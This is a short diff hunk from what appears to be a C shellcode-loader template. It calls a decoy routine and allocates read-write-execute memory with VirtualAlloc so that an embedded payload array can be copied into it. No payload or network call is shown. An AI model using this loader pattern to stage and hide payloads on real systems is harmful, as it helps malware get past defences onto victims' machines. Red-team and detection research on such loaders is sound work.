@@ -167,7 +167,7 @@ int main()
 	// Call: Decoy plugin
 	decoy();
 
-	dest = MyVirtualProtect(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);
+	dest = VirtualAlloc(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);
 
 	// FROM supermega_payload[] 
 	// TO dest[]
